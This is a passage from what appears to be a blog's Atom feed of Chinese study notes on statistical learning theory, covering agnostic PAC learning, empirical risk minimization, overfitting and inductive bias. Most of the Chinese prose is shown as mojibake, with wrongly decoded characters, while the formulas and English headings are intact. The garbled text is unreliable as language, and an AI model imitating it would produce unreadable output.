id="generalized-loss-function-agnostic-pac-learning-for-general-loss-function">Generalized Loss Function â€”â€” Agnostic PAC Learning for General Loss Function</h2><p>ä¸ºäº†é€‚åº”ä¸åŒçš„ä»»åŠ¡ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å®šä¹‰é€šç”¨çš„æŸå¤±å‡½æ•°ã€‚</p><p>ç»™å®šä»»æ„çš„é›†åˆ <span class="math inline">\(\mathcal{H}\)</span> å’Œé¢†åŸŸé›† <span class="math inline">\(Z\)</span> ï¼Œè®¾ <span class="math inline">\(l\)</span> ä¸ºä»»æ„ <span class="math inline">\(\mathcal{H}\times Z\)</span> åˆ°éè´Ÿå®æ•°çš„å‡½æ•°ï¼Œ <span class="math inline">\(l: \mathcal{H} \times Z \rightarrow \mathbb{R}_+\)</span> ï¼Œæˆ‘ä»¬ç§° <span class="math inline">\(l\)</span> ä¸º<strong>æŸå¤±å‡½æ•°</strong>ã€‚</p><p>ä¸‹é¢ç”¨åˆ†ç±»å™¨è¯¯å·®çš„æœŸæœ›æ¥å®šä¹‰<strong>é£é™©å‡½æ•°</strong>ã€‚</p><p>ç»™å®šä¸€ä¸ª <span class="math inline">\(h\in \mathcal{H}\)</span> ï¼Œå…³äºåœ¨ <span class="math inline">\(Z\)</span> ä¸Šçš„æ¦‚ç‡åˆ†å¸ƒ <span class="math inline">\(\mathcal{D}\)</span> ï¼Œå¯¹åº”çš„é£é™©å‡½æ•°ä¸ºï¼š <span class="math display">\[L_{\mathcal{D}}(h)\overset{def}{=}\underset{z\sim \mathcal{D}}{\mathbb{E}}[l(h,z)]\tag{3.3}\]</span> ç›¸ä¼¼çš„ï¼Œç»éªŒé£é™©å‡½æ•°ä¸ºå¯¹é‡‡æ ·æ ·æœ¬ <span class="math inline">\(S=(z_1,\dots,z_m)\in Z^m\)</span> ä¸Šçš„æŸå¤±çš„æœŸæœ›ï¼š <span class="math display">\[L_S(h)\overset{def}{=}\frac{1}{m}\sum_{i=1}^{m}l(h,z_i)\tag{3.4}\]</span> ç»¼ä¸Šæ‰€è¿°ï¼Œæœ‰å¦‚ä¸‹æ›´åŠ é€šç”¨çš„ Agnostic PAC çš„å®šä¹‰ï¼š</p><div class="note primary"><p><strong>Def. Agnostic PAC Learning for General Loss Function</strong></p><p>å¦‚æœ</p><ul><li><p>å­˜åœ¨ä¸€ä¸ªå‡½æ•° <span class="math inline">\(m_{\mathcal{H}}:(0,1)^2\rightarrow \mathbb{N}\)</span> ï¼Œ</p></li><li><p>å¹¶ä¸”å­˜åœ¨ä¸€ä¸ªå­¦ä¹ ç®—æ³•æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li>å¯¹äºä»»æ„çš„ <span class="math inline">\(\epsilon, \delta\in(0,1)\)</span> ï¼Œä»»æ„çš„ <span class="math inline">\(Z\)</span> ä¸Šçš„åˆ†å¸ƒ <span class="math inline">\(\mathcal{D}\)</span> ï¼Œå½“å­¦ä¹ ç®—æ³•çš„è®­ç»ƒæ ·æœ¬é‡ <span class="math inline">\(m \ge m_{\mathcal{H}}(\epsilon, \delta)\)</span> æ—¶ï¼ˆè¿™äº›è®­ç»ƒæ ·æœ¬æ˜¯ç”±ä» <span class="math inline">\(\mathcal{D}\)</span> ä¸­ç‹¬ç«‹é‡‡æ ·è€Œç”Ÿæˆçš„ï¼‰ï¼Œå­¦ä¹ ç®—æ³•ä¼šä»¥è‡³å°‘ <span class="math inline">\(1 - \delta\)</span> çš„æ¦‚ç‡è¿”å›ä¸€ä¸ªå‡è®¾ <span class="math inline">\(h\in \mathcal{H}\)</span>ï¼Œå¹¶ä¸”è¯¥å‡è®¾æ»¡è¶³ <span class="math display">\[L_{\mathcal{D}}(h) \le \underset{h&#39;\in\mathcal{H}}{min}L_{\mathcal{D}}(h&#39;)+ \epsilon\]</span> å…¶ä¸­ <span class="math inline">\(L_{\mathcal{D}}(h) = \mathbb{E}_{z\sim D}[l(h, z)]\)</span></li></ul></li></ul><p>åˆ™ä¸€ä¸ªå‡è®¾ç±» <span class="math inline">\(\mathcal{H}\)</span> å…³äºä¸€ä¸ªé›†åˆ <span class="math inline">\(Z\)</span> å’Œ æŸå¤±å‡½æ•° <span class="math inline">\(l:\mathcal{H}\times Z\rightarrow \mathbb{R}_+\)</span> æ˜¯ Agnostic PAC å¯å­¦ä¹ çš„</p></div><h1 id="reference">Reference</h1><p>Shai Shalev-Shwartz, Shai Ben-David. <a href="https://www.cs.huji.ac.il/~shais/UnderstandingMachineLearning/index.html" target="_blank" rel="noopener">Understanding Machine Learning: From Theory to Algorithms</a></p>]]></content>
        <author>
            <name><![CDATA[CosmosNingçš„ä¸ªäººåšå®¢]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://cosmosning.github.io/2020/09/16/statistical-learning-framework-and-empirical-risk-minimization/</id>
        <title><![CDATA[ç»Ÿè®¡å­¦ä¹ æ¡†æ¶åŠç»éªŒé£é™©æœ€å°åŒ–]]></title>
        <updated>2021-05-14T12:17:25+08:00</updated>
        <link href="https://cosmosning.github.io/2020/09/16/statistical-learning-framework-and-empirical-risk-minimization/"/>
        <content type="text/html" src="https://cosmosning.github.io/2020/09/16/statistical-learning-framework-and-empirical-risk-minimization/"><![CDATA[<blockquote><p>æœ¬æ–‡ä¸»è¦ä»‹ç»ä¸¤ä¸ªå†…å®¹ï¼š</p><ol type="1"><li><strong>ç»Ÿè®¡å­¦ä¹ æ¡†æ¶</strong>ã€‚è¿™æ˜¯ä¸€ä¸ªååˆ†é€šç”¨çš„æ¡†æ¶ï¼ŒæŒ‡æ˜äº†å­¦ä¹ çš„<strong>è¾“å…¥</strong>ã€<strong>è¾“å‡º</strong>å’Œ<strong>å­¦ä¹ ç›®æ ‡</strong>ã€‚</li><li><strong>ç»éªŒé£é™©æœ€å°åŒ–</strong>ï¼ˆ<strong>ERM</strong>ï¼‰çš„å­¦ä¹ æ–¹æ³•ã€‚å¼•å…¥<strong>ç»éªŒé£é™©</strong>ï¼Œä»è€Œå¯ä»¥<strong>ä»è®­ç»ƒæ•°æ®ä¸­ç®¡ä¸­çª¥è±¹</strong>ï¼Œå½’çº³å‡ºä¸€èˆ¬è§„å¾‹ã€‚ä½†æ˜¯ ERM <strong>ä¼šäº§ç”Ÿè¿‡æ‹Ÿåˆ</strong>ç°è±¡ã€‚ä¸€ç§å¸¸è§çš„è§£å†³æ–¹æ¡ˆæ˜¯<strong>å¼•å…¥å½’çº³åå¥½</strong>ï¼ˆæˆ–è€…æ˜¯å…ˆéªŒçŸ¥è¯†ï¼‰ã€‚å…·ä½“æ¥è¯´ï¼Œç¡®å®šä¸€ä¸ªæœ‰<strong>é™çš„å‡è®¾ç±»</strong>é›†åˆï¼Œä¾›å­¦ä¹ ç®—æ³•å­¦ä¹ ã€‚è¿™æ ·æ˜¯å¦æ˜¯æœ‰æ•ˆçš„ï¼Ÿé€šè¿‡è¯æ˜å‘ç°ï¼Œ<strong>åªè¦æœ‰è¶³å¤Ÿçš„è®­ç»ƒæ ·æœ¬ï¼Œå°±å¯ä»¥è¾¾åˆ°æ¯”è¾ƒå¥½çš„æ•ˆæœ</strong>ã€‚</li></ol></blockquote><h1 id="a-formal-model-the-statistical-learning-framework">A Formal Model â€”â€” The Statistical Learning Framework</h1><h2 id="the-learners-input">The Learner's Input</h2><ul><li><strong>é¢†åŸŸé›†ï¼ˆ<em>Domain set</em>ï¼‰</strong>ï¼šè¿™æ˜¯æˆ‘ä»¬<strong>å¸Œæœ›æ ‡è®°çš„äº‹ç‰©çš„é›†åˆ</strong>ï¼Œè®°ä½œ <span class="math inline">\(\mathcal{X}\)</span> ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œäººä»¬ä¼šç”¨ä¸€ä¸ªç‰¹æ€§å‘é‡ï¼ˆvector of <em>features</em>ï¼‰è¡¨ç¤ºè¿™äº›é¢†åŸŸç‚¹ï¼ˆ<em>domain points</em>ï¼‰ã€‚</li></ul><div class="note info"><ul><li>é¢†åŸŸé›†ï¼ˆ<em>domain set</em>ï¼‰åˆç§°ä½œå®ä¾‹ç©ºé—´ï¼ˆ<em>instance space</em>ï¼‰</li><li>é¢†åŸŸç‚¹ï¼ˆ<em>domain points</em>ï¼‰åˆç§°ä½œå®ä¾‹ï¼ˆ<em>instances</em>ï¼‰</li></ul></div><ul><li><strong>æ ‡ç­¾é›†ï¼ˆ<em>Label set</em>ï¼‰</strong>ï¼šè¿™æ˜¯<strong>å¯èƒ½çš„æ ‡ç­¾çš„é›†åˆ</strong>ï¼Œè®°ä½œ <span class="math inline">\(\mathcal{Y}\)</span> ã€‚</li><li><strong>è®­ç»ƒæ•°æ®ï¼ˆ<em>Training data</em>ï¼‰</strong>ï¼šè¿™æ˜¯ä¸€ç³»åˆ—å·²ç»è¢«æ ‡è®°çš„é¢†åŸŸç‚¹ï¼Œå¸¸å¸¸è¡¨ç¤ºä¸º <span class="math inline">\(S=((x_1,\ y_1)\dots(x_m,\ y_m))\)</span> ï¼ˆè¿™æ˜¯åœ¨ <span class="math inline">\(\mathcal{X}\times \mathcal{Y}\)</span> ä¸­çš„<strong>æœ‰é™</strong>çš„æ•°å¯¹åºåˆ—ï¼‰</li></ul><div class="note info"><ul><li>è®­ç»ƒæ•°æ®ï¼ˆ<em>training data</em>ï¼‰åˆç§°ä½œ <strong><em>training examples</em></strong>ï¼Œæˆ–è€… <strong><em>training set</em></strong></li></ul></div><h2 id="the-learners-output">The Learner's Output</h2><p>äººä»¬å¸Œæœ›å­¦ä¹ å™¨è¾“å‡ºä¸€ä¸ª<strong>é¢„æµ‹è§„åˆ™</strong>ï¼ˆ<em>prediction rule</em>ï¼‰ï¼š<span class="math inline">\(h:\mathcal{X} \rightarrow \mathcal{Y}\)</span> ã€‚è¿™ä¸ªå‡½æ•°åˆç§°ä½œä¸º<strong>é¢„æµ‹å™¨</strong>ï¼ˆ<em>predictor</em>ï¼‰ã€<strong>å‡è®¾</strong>ï¼ˆ<em>hypothesis</em>ï¼‰æˆ–è€…æ˜¯<strong>åˆ†ç±»å™¨</strong>ï¼ˆ<em>classifier</em>ï¼‰ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬è®°ä¸€ä¸ªå­¦ä¹ ç®—æ³• <span class="math inline">\(A\)</span> ï¼Œæ¥å—è®­ç»ƒæ•°æ® <span class="math inline">\(S\)</span> ä¸ºè¾“å…¥ï¼Œè¿”å›å¯¹åº”å‡è®¾ä¸º <span class="math inline">\(A(S)\)</span> ã€‚</p><h2 id="a-simple-data-generation-model">A Simple Data-generation Model</h2><p>è®­ç»ƒæ•°æ®æ˜¯å¦‚ä½•ç”Ÿæˆçš„ï¼Ÿè¿™é‡Œç»™å‡ºä¸¤ä¸ªå‡è®¾ã€‚</p><ul><li>å‡è®¾æ‰€æœ‰çš„å®ä¾‹éƒ½ç”±ä¸€ä¸ªæ¦‚ç‡åˆ†å¸ƒç”Ÿæˆï¼Œè®°è¿™ä¸ªåœ¨ <span class="math inline">\(\mathcal{X}\)</span> ä¸Šçš„æ¦‚ç‡åˆ†å¸ƒä¸º <span class="math inline">\(\mathcal{D}\)</span> ã€‚</li><li>å‡è®¾å­˜åœ¨ä¸€ä¸ªâ€œå®Œå…¨æ­£ç¡®â€çš„æ ‡è®°å‡½æ•° <span class="math inline">\(f:\mathcal{X}\rightarrow \mathcal{Y}\)</span> ï¼Œæ˜¾ç„¶ï¼Œå¯¹äºä»»æ„çš„ <span class="math inline">\(i\)</span> ï¼Œæœ‰ <span class="math inline">\(y_i=f(x_i)\)</span></li></ul><p>æ€»çš„æ¥è¯´ï¼Œåœ¨è®­ç»ƒæ•°æ®ä¸­çš„æ¯ä¸€ä¸ªæ•°å¯¹ï¼Œéƒ½ç”±ä»¥ä¸‹æ–¹å¼ç”Ÿæˆï¼š</p><ol type="1"><li>å…ˆä»æ¦‚ç‡åˆ†å¸ƒ <span class="math inline">\(\mathcal{D}\)</span> é‡‡æ ·å¾—åˆ°ä¸€ä¸ªç‚¹ <span class="math inline">\(x_i\)</span> ï¼›</li><li>å†åˆ©ç”¨æ ‡è®°å‡½æ•° <span class="math inline">\(f\)</span> ä¸º <span class="math inline">\(x_i\)</span> æ‰“ä¸Šæ ‡ç­¾ã€‚</li></ol><h2 id="measures-of-success">Measures of Success</h2><p>å¦‚ä½•è¡¡é‡ç®—æ³•å­¦ä¹ æ˜¯å¦æˆåŠŸï¼Ÿè¿™é‡Œå¯ä»¥å®šä¹‰ä¸€ä¸ª<strong>åˆ†ç±»å™¨çš„è¯¯å·®</strong>ï¼ˆ<em>error of a classifier</em>ï¼‰ï¼Œå³å­¦ä¹ ç®—æ³•æ²¡æœ‰æ­£ç¡®é¢„æµ‹éšæœºæ•°æ®ï¼ˆè¿™äº›éšæœºæ•°æ®ï¼Œæ˜¯ç”±å‰é¢æåˆ°çš„å¯¹äºå­¦ä¹ ç®—æ³•éšå«çš„æ¦‚ç‡åˆ†å¸ƒæ‰€ç”Ÿæˆçš„ï¼‰çš„æ ‡ç­¾çš„æ¦‚ç‡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ<span class="math inline">\(h\)</span> çš„è¯¯å·®æ˜¯<strong>ä»åˆ†å¸ƒ <span class="math inline">\(\mathcal{D}\)</span> éšæœºä¸­å–å‡ºä¸€ä¸ª <span class="math inline">\(x\)</span> ï¼Œè€Œ <span class="math inline">\(h(x)\)</span> ä¸ç­‰äº <span class="math inline">\(f(x)\)</span> çš„æ¦‚ç‡</strong>ã€‚</p><p>è§„èŒƒçš„æ¥è®²ï¼Œç»™å®šä¸€ä¸ªé¢†åŸŸå­é›†ï¼ˆ<em>domain subset</em>ï¼‰ï¼Œ<span class="math inline">\(A\subset \mathcal{X}\)</span> ï¼Œæ¦‚ç‡åˆ†å¸ƒ <span class="math inline">\(\mathcal{D}\)</span> ï¼Œå®šä¹‰ä¸€ä¸ªæ•° <span class="math inline">\(\mathcal{D}(A)\)</span> ï¼Œå…¶ä¸­ <span class="math inline">\(\mathcal{D}(A)\)</span> è¡¨ç¤ºå­¦ä¹ ç®—æ³•åœ¨ <span class="math inline">\(\mathcal{D}\)</span> ä¸­è§‚å¯Ÿåˆ°ä¸€ä¸ªç‚¹ <span class="math inline">\(x\in A\)</span> çš„å¯èƒ½æ€§ã€‚æˆ‘ä»¬å®šä¹‰é¢„æµ‹è§„åˆ™ï¼ˆ<em>prediction rule</em>ï¼‰çš„è¯¯å·®å¦‚ä¸‹ï¼š <span class="math display">\[L_{\mathcal{D},f}(h)\overset{def}{=}\underset{x\sim\mathcal{D}}{\mathbb{P}}[h(x)\ne f(x)]\overset{def}{=}\mathcal{D}(\lbrace x:h(x)\ne f(x)\rbrace)\tag{2.1}\]</span> <div class="note info"><p><strong>æœ‰å…³ <span class="math inline">\(A\)</span> ä¸ <span class="math inline">\(\mathcal{D}(A)\)</span> çš„è¡¥å……è¯´æ˜</strong></p><ul><li>åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°† <span class="math inline">\(A\)</span> ç§°ä½œä¸€ä¸ªäº‹ä»¶ï¼ˆ<em>event</em>ï¼‰</li><li>äºŒå…ƒåˆ†ç±»é—®é¢˜ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰ <span class="math inline">\(A\)</span> ä¸º <span class="math inline">\(\pi :\mathcal{X}\rightarrow \lbrace0,1\rbrace\)</span> ï¼Œä¹Ÿå°±æœ‰ <span class="math inline">\(A = \lbrace x\in\mathcal{X}: \pi(x) = 1\rbrace\)</span> ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¹Ÿä½¿ç”¨ <span class="math inline">\(\mathbb{P}_{x\sim \mathcal{D}}[\pi(x)]\)</span> æ¥è¡¨è¾¾ <span class="math inline">\(\mathcal{D}(A)\)</span> ã€‚</li></ul></div></p><div class="note info"><p><strong><span class="math inline">\(L_{\mathcal{D},f}\)</span> çš„åˆ«ç§°</strong></p><p><span class="math inline">\(L_{\mathcal{D},f}\)</span> åˆç§°ä½œ<strong>æ³›åŒ–è¯¯å·®</strong>ï¼ˆ<strong><em>generalization error</em></strong>ï¼‰ï¼Œ<strong>é£é™©</strong>ï¼ˆ<strong><em>risk</em></strong>ï¼‰ï¼Œ<strong><span class="math inline">\(h\)</span> çš„çœŸæ­£è¯¯å·®</strong>ï¼ˆ<strong><em>true error</em> of h</strong>ï¼‰</p></div><h2 id="a-note-about-the-information-available-to-the-learner">A Note about The Information Available to The Learner</h2><p>è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>å­¦ä¹ å™¨æœ¬èº«å¹¶ä¸çŸ¥æ™“éšå«çš„æ¦‚ç‡åˆ†å¸ƒ <span class="math inline">\(\mathcal{D}\)</span> å’Œ â€œå®Œå…¨æ­£ç¡®â€ çš„æ ‡è®°å‡½æ•° <span class="math inline">\(f\)</span></strong> ã€‚å› æ­¤ï¼Œå­¦ä¹ å™¨åªèƒ½é€šè¿‡è§‚å¯Ÿè®­ç»ƒæ•°æ®é›†ï¼Œå’Œç¯å¢ƒäº¤äº’ï¼Œæ‰èƒ½å‘ç°è§„å¾‹ã€‚</p><div class="note info"><h2 id="summary">Summary</h2><ul><li><strong>å­¦ä¹ ç®—æ³•çš„è¾“å…¥å’Œè¾“å‡º</strong>ï¼šä¸€ä¸ªå­¦ä¹ ç®—æ³•æ¥å—ä¸€ä¸ª<strong>è®­ç»ƒé›†</strong> <span class="math inline">\(S\)</span> ä½œä¸º<strong>è¾“å…¥</strong>ï¼Œå¹¶ä¸”<strong>è¾“å‡º</strong>ä¸€ä¸ª<strong>é¢„æµ‹å™¨</strong>ï¼ˆ<em>predictor</em>ï¼‰ <span class="math inline">\(h_S: \mathcal{X} \rightarrow \mathcal{Y}\)</span> ã€‚å…¶ä¸­ï¼Œè®­ç»ƒé›† <span class="math inline">\(S\)</span> é€šè¿‡ä»¥ä¸‹è¿‡ç¨‹ç”Ÿæˆï¼šé¦–å…ˆä»ä¸€ä¸ªæœªçŸ¥åˆ†å¸ƒ <span class="math inline">\(D\)</span> ä¸­é‡‡æ ·ï¼Œç„¶åä½¿ç”¨ç›®æ ‡å‡½æ•°ï¼ˆ<em>target function</em>ï¼‰ <span class="math inline">\(f\)</span> æ ‡è®°ã€‚æ­¤å¤–ï¼Œé¢„æµ‹å™¨ <span class="math inline">\(h_S\)</span> çš„ä¸‹æ ‡ <span class="math inline">\(S\)</span> å¼ºè°ƒäº†è¾“å‡ºçš„ <span class="math inline">\(h_S\)</span> æ˜¯ä¾èµ–äº <span class="math inline">\(S\)</span> çš„ã€‚</li><li><strong>å­¦ä¹ ç®—æ³•çš„ç›®æ ‡</strong>ï¼šå­¦ä¹ ç®—æ³•çš„ç›®æ ‡æ˜¯æ‰¾åˆ°ä¸€ä¸ª <span class="math inline">\(h_S\)</span> ï¼Œå…³äºæœªçŸ¥åˆ†å¸ƒ <span class="math inline">\(\mathcal{D}\)</span> å’Œæ ‡è®°å‡½æ•° <span class="math inline">\(f\)</span> ï¼Œå®ƒèƒ½æœ€å°åŒ–è¯¯å·®ã€‚</li></ul></div><h1 id="empirical-risk-minimization-erm">Empirical Risk Minimization ï¼ˆERMï¼‰</h1><h2 id="empirical-error">Empirical Error</h2><p>ç”±äºå­¦ä¹ å™¨å¹¶ä¸çŸ¥é“ <span class="math inline">\(\mathcal{D}\)</span> å’Œ <span class="math inline">\(f\)</span> ï¼Œå› æ­¤ï¼Œå¼ï¼ˆ2.1ï¼‰æ— æ³•ç›´æ¥è®¡ç®—ã€‚å­¦ä¹ å™¨èƒ½å¤Ÿè®¡ç®—çš„æ˜¯<strong>è®­ç»ƒè¯¯å·®</strong>ï¼ˆ<em>training error</em>ï¼‰ï¼Œå³åˆ†ç±»å™¨åœ¨è®­ç»ƒæ•°æ®ä¸Šäº§ç”Ÿçš„è¯¯å·®ï¼Œå…¶å®šä¹‰å¦‚ä¸‹ï¼š <span class="math display">\[L_S(h)\overset{def}{=}\frac{|\lbrace i\in[m]:h(x_i)\ne y_i \rbrace|}{m}\tag{2.2}\]</span></p><p>å…¶ä¸­ <span class="math inline">\([m]=\lbrace 1,\dots ,m\rbrace\)</span> ã€‚</p><div class="note info"><p><strong>è®­ç»ƒè¯¯å·®</strong>ï¼ˆ<em>training error</em>ï¼‰æœ‰æ—¶åˆç§°ä½œ<strong>ç»éªŒè¯¯å·®</strong>ï¼ˆ<strong><em>empirical error</em></strong>ï¼‰æˆ–è€…<strong>ç»éªŒé£é™©</strong>ï¼ˆ<strong><em>empirical risk</em></strong>ï¼‰</p></div><h2 id="erm">ERM</h2><p>æ—¢ç„¶å­¦ä¹ ç®—æ³•èƒ½å¤Ÿä»è®­ç»ƒæ•°æ®ä¸­è·å–å…³äºè¿™ä¸ªä¸–ç•Œçš„ç®€è¦æƒ…å†µï¼Œæ‰€ä»¥å¯»æ‰¾ä¸€ä¸ªåœ¨è®­ç»ƒæ•°æ®ä¸Šæ•ˆæœè‰¯å¥½çš„ç­”æ¡ˆæ˜¯è¯´å¾—é€šçš„ã€‚<strong>å¯»æ‰¾ä¸€ä¸ªæœ€å°åŒ– <span class="math inline">\(L_S(h)\)</span> çš„ <span class="math inline">\(h\)</span></strong> çš„å­¦ä¹ èŒƒå¼ç§°ä½œç»éªŒé£é™©æœ€å°åŒ–ï¼ˆ<strong>Empirical Risk Minimization</strong>ï¼‰ï¼Œç®€ç§° <strong>ERM</strong></p><h2 id="the-problem-of-erm-overfitting">The problem of ERM â€”â€” Overfitting</h2><p>ç„¶è€Œï¼ŒERM å¯èƒ½ä¼šäº§ç”Ÿä¸€ç§é”™è¯¯â€”â€”è¿‡æ‹Ÿåˆã€‚ä¸‹é¢ç”¨ä¸€ä¸ªä¾‹å­è¯´æ˜ã€‚</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/09/example-of-overfitting.PNG" alt="è¿‡æ‹Ÿåˆçš„ä¾‹å­. Source:ã€ŠUnderstanding Machine Learning: From Theory to Algorithmsã€‹" /><figcaption>è¿‡æ‹Ÿåˆçš„ä¾‹å­. Source:ã€ŠUnderstanding Machine Learning: From Theory to Algorithmsã€‹</figcaption></figure><p>å‡è®¾æ¦‚ç‡åˆ†å¸ƒ <span class="math inline">\(\mathcal{D}\)</span> æ˜¯ç°è‰²æ­£æ–¹å½¢æ¡†ä¸­çš„å‡åŒ€åˆ†å¸ƒï¼Œå¦‚æœå®ä¾‹è½åœ¨è“è‰²å®ä¾‹æ‰€åœ¨çš„é»‘è‰²æ­£æ–¹å½¢æ¡†ä¸­ï¼Œæ ‡è®°å‡½æ•° <span class="math inline">\(f\)</span> å°†å…¶æ ‡è®°ä¸º 1ï¼Œå¦åˆ™æ ‡è®°ä¸º 0ã€‚è€ƒè™‘å¦‚ä¸‹çš„é¢„æµ‹å™¨ï¼š</p><p><span class="math display">\[h_S(x)= \begin{cases}y_i\quad &amp;if\ \exists i\in[m]\ s.t. x_i=x;\\0\quad &amp;ohterwise. \end{cases}\]</span></p><p>å› ä¸º <span class="math inline">\(h_S\)</span> åœ¨è®­ç»ƒæ•°æ®ä¸Šï¼Œå¯¹å®ä¾‹æ ‡ç­¾çš„é¢„æµ‹å…¨éƒ¨æ­£ç¡®ï¼Œæ‰€ä»¥ <span class="math inline">\(L_S(h_s) = 0\)</span> ã€‚æ ¹æ®ç»éªŒé£é™©æœ€å°åŒ–çš„åŸåˆ™ï¼Œå¼å­ ï¼ˆ2.3ï¼‰ä¼šè¢« ERM é€‰ä¸­ï¼ˆå› ä¸ºæ²¡æœ‰æ¯” 0 æ›´å°çš„è®­ç»ƒæŸå¤±ï¼‰ã€‚ç„¶è€Œå¦‚æœå–è®­ç»ƒæ•°æ®ä»¥å¤–çš„ä¸€ä¸ªç‚¹ <span class="math inline">\(x&#39;\)</span>ï¼Œå¹¶ä¸”è¿™ä¸ªç‚¹åœ¨é»‘è‰²æ­£æ–¹å½¢æ¡†ä¸­ï¼Œé‚£ä¹ˆæ ¹æ®å¼ï¼ˆ2.3ï¼‰ï¼Œ<span class="math inline">\(h_S(x&#39;) = 0\)</span> ã€‚è€Œå®é™…ä¸Š <span class="math inline">\(f(x&#39;) = 1\)</span>ï¼Œè¿™å°±ä¼šäº§ç”Ÿé”™è¯¯ã€‚</p><p>è¿™ç§ç°è±¡ç§°ä½œ<strong>â€œè¿‡æ‹Ÿåˆâ€</strong>ï¼ˆ<em>overfitting</em>ï¼‰ã€‚ç›´è§‚çš„æ¥è¯´ï¼Œå½“å­¦ä¹ ç®—æ³•æ‰¾åˆ°çš„å‡è®¾<strong>å¤ªç¬¦åˆ</strong>è®­ç»ƒæ•°æ®æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¿‡æ‹Ÿåˆã€‚</p><h2 id="empirical-risk-minimization-with-inductive-bias">Empirical Risk Minimization with Inductive Bias</h2><h3 id="applying-erm-over-a-restricted-search-space">Applying ERM over a Restricted Search Space</h3><p>ä¸€ç§å¸¸è§çš„è§£å†³ ERM è¿‡æ‹Ÿåˆçš„æ–¹æ³•æ˜¯<strong>é™åˆ¶ ERM çš„æœç´¢ç©ºé—´</strong>ã€‚è§„èŒƒçš„è®²ï¼Œåœ¨è§åˆ°æ•°æ®ä¹‹å‰ï¼Œå­¦ä¹ å™¨åº”è¯¥äº‹å…ˆæŒ‘é€‰å‡ºä¸€ä¸ªé¢„æµ‹å™¨é›†åˆã€‚è¿™ä¸ªé¢„æµ‹å™¨é›†åˆåˆç§°ä½œ<strong>â€œå‡è®¾ç±»â€</strong>ï¼ˆ<em>hypothesis class</em>ï¼‰ï¼Œè®°ä½œ <span class="math inline">\(\mathcal{H}\)</span> ã€‚æ¯ä¸€ä¸ª <span class="math inline">\(h\in \mathcal{H}\)</span> æ˜¯ä¸€ä¸ª <span class="math inline">\(\mathcal{X}\rightarrow \mathcal{Y}\)</span> çš„å‡½æ•°ã€‚<strong>ç»™å®šä¸€ä¸ªå‡è®¾ç±» <span class="math inline">\(\mathcal{H}\)</span> ï¼Œä¸€ä¸ªè®­ç»ƒé›† <span class="math inline">\(\mathcal{S}\)</span> ï¼Œ<span class="math inline">\(ERM_{\mathcal{H}}\)</span> å­¦ä¹ å™¨ä½¿ç”¨ ERM è§„åˆ™æ¥é€‰å–ä¸€ä¸ªåœ¨ <span class="math inline">\(\mathcal{S}\)</span> ä¸Šæœ‰æœ€å°å¯èƒ½è¯¯å·®çš„ <span class="math inline">\(h\)</span> ï¼Œå…¶ä¸­ <span class="math inline">\(h\in \mathcal{H}\)</span></strong> ã€‚è§„èŒƒåœ°ï¼Œæˆ‘ä»¬æœ‰å¦‚ä¸‹å…¬å¼ï¼š <span class="math display">\[ERM_{\mathcal{H}}(S)\in \underset{h\in \mathcal{H}}{argmin}(L_S(h))\]</span> å…¶ä¸­ï¼Œ<span class="math inline">\(argmin\)</span> è¡¨ç¤ºåœ¨ <span class="math inline">\(\mathcal{H}\)</span> ä¸­ä½¿å¾— <span class="math inline">\(L_S(h)\)</span> æœ€å°çš„å‡è®¾é›†åˆï¼ˆ<span class="math inline">\(h\in\mathcal{H}\)</span>ï¼‰ã€‚é€šè¿‡é™åˆ¶å­¦ä¹ å™¨ä» <span class="math inline">\(\mathcal{H}\)</span> ä¸­é€‰å–é¢„æµ‹å™¨ï¼Œå­¦ä¹ å™¨ä¼šåå‘æˆ‘ä»¬æ‰€ç‰¹å®šçš„é¢„æµ‹å™¨é›†åˆã€‚è¿™ç§é™åˆ¶å¸¸å¸¸è¢«ç§°ä¸º<strong>å½’çº³åå¥½</strong>ï¼ˆ<em>inductive bias</em>ï¼‰ã€‚ç”±äºè¿™ç§é™åˆ¶çš„é€‰æ‹©åœ¨å­¦ä¹ å™¨çœ‹åˆ°æ•°æ®ä¹‹å‰å°±ç¡®å®šäº†ï¼Œå› æ­¤åœ¨ç†æƒ³æƒ…å†µä¸‹ï¼Œå®ƒåº”è¯¥åŸºäºä¸€äº›æœ‰å…³æ‰€å­¦é—®é¢˜çš„å…ˆéªŒçŸ¥è¯†ï¼ˆ<em>prior knowledge</em>ï¼‰ã€‚</p><p>ç›´è§‚åœ°ï¼Œ<strong>é€‰æ‹©ä¸€ä¸ªé¦–å…ˆæ›´å¤šçš„å‡è®¾ç±»ä¼šæ›´å¥½åœ°é˜²æ­¢è¿‡æ‹Ÿåˆçš„å‘ç”Ÿï¼Œä½†æ˜¯ä¸æ­¤åŒæ—¶ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´ä¸€ä¸ªæ›´å¼ºçš„å½’çº³åå¥½</strong>ã€‚</p><h3 id="finite-hypothesis-classes">Finite Hypothesis Classes</h3><p>å¯¹ç±»çš„æœ€ç®€å•çš„é™åˆ¶æ˜¯è®¾ç½®ä¸€ä¸ªå…¶å¤§å°çš„ä¸Šç•Œï¼ˆä¹Ÿå°±æ˜¯ï¼Œé™åˆ¶ <span class="math inline">\(\mathcal{H}\)</span> ä¸­é¢„æµ‹å™¨ <span class="math inline">\(h\)</span> çš„ä¸ªæ•°ï¼‰ã€‚å¯¹åº”çš„ï¼Œæˆ‘ä»¬æœ‰å¦‚ä¸‹ç»“è®ºï¼š</p><ul><li><strong>åªè¦æœ‰è¶³å¤Ÿæ•°é‡çš„è®­ç»ƒæ ·æœ¬ï¼Œå¦‚æœ <span class="math inline">\(\mathcal{H}\)</span> æ˜¯ä¸€ä¸ªæœ‰é™çš„ç±»ï¼ˆ<em>finite class</em>ï¼‰ï¼Œé‚£ä¹ˆ <span class="math inline">\(ERM_{\mathcal{H}}\)</span> 